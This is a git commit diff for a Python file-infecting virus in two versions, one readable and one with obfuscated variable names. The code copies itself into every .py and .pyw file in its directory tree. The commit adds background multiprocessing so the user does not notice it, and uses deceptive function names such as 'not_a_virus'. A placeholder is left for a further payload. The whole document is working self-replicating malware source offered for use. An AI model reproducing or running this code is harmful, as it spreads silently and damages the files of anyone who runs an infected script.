297489f3232b3f6051b50d31242172c54f166a32
Barak <barakadax@gmail.com>
2020-11-17 19:33:32 +0200

    Now with multiprocessing to make your virus run without the user feeling it is running in the background.

--- main.py
+++ main.py
@@ -1,53 +1,60 @@
+# by: Barak
 ### START ###
-# by Barak
+import os
 import sys
 import glob
-import os
+from multiprocessing import Process
 
-code_to_infect = []
-with open(sys.argv[0], 'rb') as this_file:
-    virus_code = this_file.readlines()
+def not_a_virus():
+    code_to_infect = []
+    with open(sys.argv[0], 'rb') as this_file:
+        virus_code = this_file.readlines()
 
-virus_part = False
-for line in virus_code:
-    if line == b'### START ###\r\n':
-        virus_part = True
-    if virus_part:
-        code_to_infect.append(line)
-    if line == b'### END ###\r\n':
-        break
+    virus_part = False
+    for line in virus_code:
+        if line == b'### START ###\r\n':
+            virus_part = True
+        if virus_part:
+            code_to_infect.append(line)
+        if line == b'### END ###\r\n':
+            break
 
-file_directory = os.path.realpath(__file__)
-file_directory = file_directory.split('\\')
-file_directory.pop()
-this_directory = ""
-for path in file_directory:
-    this_directory += path + "\\"
-this_directory = this_directory[:-1]
+    file_directory = os.path.realpath(__file__)
+    file_directory = file_directory.split('\\')
+    file_directory.pop()
+    this_directory = ""
+    for path in file_directory:
+        this_directory += path + "\\"
+    this_directory = this_directory[:-1]
 
-full_dir_sub_folders = os.walk(this_directory)
-full_dir_sub_folders = list(full_dir_sub_folders)
+    full_dir_sub_folders = os.walk(this_directory)
+    full_dir_sub_folders = list(full_dir_sub_folders)
 
-short_dir_path = []
-for dir_num in range(0, len(full_dir_sub_folders)):
-    short_dir_path.append(full_dir_sub_folders[dir_num][0][len(this_directory) + 1:])
+    short_dir_path = []
+    for dir_num in range(0, len(full_dir_sub_folders)):
+        short_dir_path.append(full_dir_sub_folders[dir_num][0][len(this_directory) + 1:])
 
-files = []
-files += glob.glob('*.py') + glob.glob('*.pyw')
-for folder in short_dir_path:
-    files += glob.glob(f'{folder}/*.py') + glob.glob(f'{folder}/*.pyw')
+    files = []
+    files += glob.glob('*.py') + glob.glob('*.pyw')
+    for folder in short_dir_path:
+        files += glob.glob(f'{folder}/*.py') + glob.glob(f'{folder}/*.pyw')
 
-for file in files:
-    with open(file, 'rb') as target_file:
-        target_code = target_file.readlines()
-    if b'### START ###\r\n' in target_code:
-        continue
-    code = []
-    code += code_to_infect
-    code += list(target_code)
-    with open(file, 'wb') as infect:
-        infect.writelines(code)
+    for file in files:
+        with open(file, 'rb') as target_file:
+            target_code = target_file.readlines()
+        if b'### START ###\r\n' in target_code:
+            continue
+        code = []
+        code += code_to_infect
+        code += list(target_code)
+        code.append(b'\r\n')
+        with open(file, 'wb') as infect:
+            infect.writelines(code)
 
-# ENTER VIRUS CODE HERE!!!#
+    # ENTER VIRUS CODE HERE!!!#
+    # Virus code...
 
+if __name__ == "__main__":
+    not_malicious = Process(target=not_a_virus)
+    not_malicious.start()
 ### END ###
--- unreadableMain.py
+++ unreadableMain.py
@@ -1,44 +1,51 @@
-### START ###
+# S
+import os
 import sys
 import glob
-import os
-_v0 = []
-with open(sys.argv[0], 'rb') as _v1:
-    _v2 = _v1.readlines()
-_v3 = False
-for _v4 in _v2:
-    if _v4 == b'### START ###\r\n':
-        _v3 = True
-    if _v3:
-        _v0.append(_v4)
-    if _v4 == b'### END ###\r\n':
-        break
-_v5 = os.path.realpath(__file__)
-_v5 = _v5.split('\\')
-_v5.pop()
-_v6 = ""
-for _v7 in _v5:
-    _v6 += _v7 + "\\"
-_v6 = _v6[:-1]
-_v8 = os.walk(_v6)
-_v8 = list(_v8)
-_v9 = []
-for _vA in range(0, len(_v8)):
-    _v9.append(
-        _v8[_vA][0][len(_v6) + 1:])
-_vB = []
-_vB += glob.glob('*.py') + glob.glob('*.pyw')
-for _vC in _v9:
-    _vB += glob.glob(f'{_vC}/*.py') + glob.glob(f'{_vC}/*.pyw')
-for _vD in _vB:
-    with open(_vD, 'rb') as _vE:
-        _vF = _vE.readlines()
-    if b'### START ###\r\n' in _vF:
-        continue
-    _v10 = []
-    _v10 += _v0
-    _v10 += list(_vF)
-    with open(_vD, 'wb') as _v11:
-        _v11.writelines(_v10)
-# ENTER VIRUS CODE HERE!!!#
-### END ###
+from multiprocessing import Process
+def _f9():
+    _v2 = []
+    with open(sys.argv[0], 'rb') as _v7:
+        _v9 = _v7.readlines()
+    _v17 = False
+    for _v8 in _v9:
+        if _v8 == b'# S\r\n':
+            _v17 = True
+        if _v17:
+            _v2.append(_v8)
+        if _v8 == b'# E\r\n':
+            break
+    _v0 = os.path.realpath(__file__)
+    _v0 = _v0.split('\\')
+    _v0.pop()
+    _v6 = ""
+    for _v10 in _v0:
+        _v6 += _v10 + "\\"
+    _v6 = _v6[:-1]
+    _v16 = os.walk(_v6)
+    _v16 = list(_v16)
+    _v5 = []
+    for _v18 in range(0, len(_v16)):
+        _v5.append(
+            _v16[_v18][0][len(_v6) + 1:])
+    _v3 = []
+    _v3 += glob.glob('*.py') + glob.glob('*.pyw')
+    for _v13 in _v5:
+        _v3 += glob.glob(f'{_v13}/*.py') + glob.glob(f'{_v13}/*.pyw')
+    for _v1 in _v3:
+        with open(_v1, 'rb') as _v12:
+            _v14 = _v12.readlines()
+        if b'# S\r\n' in _v14:
+            continue
+        _v11 = []
+        _v11 += _v2
+        _v11 += list(_v14)
+        _v11.append(b'\r\n')
+        with open(_v1, 'wb') as _v15:
+            _v15.writelines(_v11)
+    # ENTER VIRUS CODE HERE!!!#
+    # Virus code...
+if __name__ == "__main__":
+    _p1 = Process(target=_f9)
+    _p1.start()
+# E
